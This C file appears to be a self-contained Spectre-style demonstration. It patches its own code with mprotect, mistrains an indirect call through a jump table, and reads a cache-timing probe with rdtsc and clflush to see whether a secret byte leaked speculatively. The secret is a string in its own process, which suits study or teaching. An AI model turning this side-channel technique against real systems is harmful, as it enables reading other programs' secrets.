#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <x86intrin.h>
#include <sys/types.h>
#include <sys/mman.h>

typedef void (*Handler)(void);

__attribute__((section(".rodata.transmit"), aligned(0x1000))) const char transmit_space[0x100000] = {1};
__attribute__((constructor)) void init() {
    for (int i = 0; i < sizeof(transmit_space)/0x1000; i++)
        *(volatile char *) &transmit_space[i*0x1000];
}

const char* secret = "This is my secret\n";

void touch_and_break(void){
    char a = *secret;
    char b = transmit_space[a * 0x1000];
}

void do_nothing(void){}

Handler jump_table[2] = {touch_and_break, do_nothing};      //跳转表

int probetime(void *adrs) {
    volatile unsigned long time;
    asm __volatile__ (
                    " mfence\n"
                    " lfence\n"
                    " rdtsc\n"
                    " lfence\n"
                    " movl %%eax, %%esi \n"
                    " movl (%1), %%eax\n"
                    " lfence\n"
                    " rdtsc\n"
                    " subl %%esi, %%eax \n"
                    " clflush 0(%1)\n"
                    : "=a" (time)
                    : "c" (adrs)
                    : "%esi", "%edx");
                    return time;
}

int main(){
    char origin = *(char*)touch_and_break;
    int i;
    unsigned long p = touch_and_break;
    p &= ~0xfff;
    if(mprotect((void*)p, 0x1000, PROT_WRITE | PROT_READ | PROT_EXEC) != 0){
        printf("change protect mode error\n");
        return 0;
    }

    for(i = 0; i < 40; i++){
        if(i < 39)
            *(char*)touch_and_break = 0xc3;         //ret
        else{
            _mm_clflush(jump_table);
        }
        jump_table[(i / 39)]();
        *(char*)touch_and_break = origin;
    }
    printf("access time %d\n", probetime(&transmit_space['T' * 0x1000]));
    return 0;
}